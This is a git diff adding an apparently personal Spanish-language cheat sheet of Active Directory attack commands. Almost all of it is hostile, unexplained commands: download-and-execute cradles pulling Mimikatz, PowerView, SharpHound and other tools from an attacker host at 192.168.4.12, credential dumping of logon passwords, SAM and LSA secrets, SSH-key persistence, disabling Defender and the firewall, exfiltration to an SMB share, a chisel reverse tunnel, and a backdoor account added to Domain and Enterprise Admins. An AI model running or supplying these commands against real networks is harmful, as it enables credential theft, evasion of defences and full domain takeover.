@@ -2,6 +2,80 @@
 
 Tags: #AD #Glosario 
 
+## Tools 
+
+```bash 
+https://github.com/Spartan-Cybersecurity/CPAD-Tools        # Herramientas de ayuda 
+```
+
+## Comandos AD 
+
+```bash 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo "ssh-rsa AAAAB3NzaC1= root@kali" >> ~/.ssh/authorized_keys
+
+certutil.exe -f -urlcache -split http://192.168.4.12/bypass.exe
+bitsadmin /transfer myJob http://192.168.4.12/EjecutaEsto.exe C:\\Windows\\Tasks\\EjecutaEsto.exe
+
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/PowerView.ps1');
+certutil.exe -f -urlcache -split http://192.168.4.12/HeidiSQL.zip
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/PowerUpSQL.ps1');
+Get-SQLInstanceDomain | Get-SQLConnectionTest
+Get-SQLServerLink -Instance localhost 
+Invoke-SQLAudit -Instance localhost
+
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/Invoke-Mimikatz.ps1');
+Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
+certutil.exe -f -urlcache -split http://192.168.4.12/mimikatz.exe
+.\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit 
+
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/adPEAS-Light.ps1'); Invoke-adPeas -Outputfile result-adpeas.txt
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/SharpHound.ps1'); 
+Invoke-BloodHound -CollectionMethod All -Domain Domain1.corp -ZipFileName luna.zip
+
+
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.4.12/PsExec64.exe', 'c:\Users\Public\PsExec64.exe')
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.4.12/PetitPotato.exe', 'c:\Users\Public\PetitPotato.exe')
+
+certutil.exe -f -urlcache -split http://192.168.4.12/SharpHound.exe
+.\SharpHound.exe --CollectionMethods All --Domain Domain1.corp
+
+Set-MpPreference -DisableIOAVProtection $true -Verbose
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+Get-MpPreference | select DisableIOAVProtection, DisableRealtimeMonitoring
+Set-NetFirewallProfile -name Domain,Private,Public -Enabled False -Verbose
+netsh advfirewall set allprofiles state off
+
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+
+net use \\192.168.4.12\kali-share /u:kali kali
+copy \\192.168.4.12\kali-share\BypassCLM-bin.exe .
+copy 20230915084901_BloodHound.zip \\192.168.4.12\kali-share\
+
+iwr -uri http://192.168.4.12/chisel.exe -o c:\windows\tasks\chisel.exe
+c:\windows\tasks\chisel.exe client 192.168.4.12:9090 R:9050:socks
+
+iwr -uri http://192.168.4.12/NimScan.exe -o c:\windows\tasks\NimScan.exe
+c:\windows\tasks\NimScan.exe 
+
+IEX (New-Object Net.WebClient).DownloadString('import-module https://raw.githubusercontent.com/PowerSploit/dev/Recon/PowerView.ps1');
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/Invoke-Portscan.ps1');
+Get-DomainComputer -Properties cn | select -first 8 | %{Invoke-Portscan -Hosts $_.cn -TopPorts 50 -Threads 4}
+
+iwr -uri http://192.168.4.12/NimScan.exe -o c:\windows\tasks\NimScan.exe
+
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/winPEAS.ps1');
+iwr -uri http://192.168.4.12/winPEASany.exe -o c:\windows\tasks\winPEASany.exe
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/PowerUp.ps1')
+
+
+net user sephiroth Pass123 /add /domain
+net localgroup Administrators sephiroth /add /domain
+net localgroup 'Remote Desktop Users' sephiroth /add /domain
+net group 'Domain Admins' sephiroth /add
+net group 'Enterprise Admins' sephiroth /add
+```
+
 ## CyberKillChain recomendado en AD
 
 ```bash 
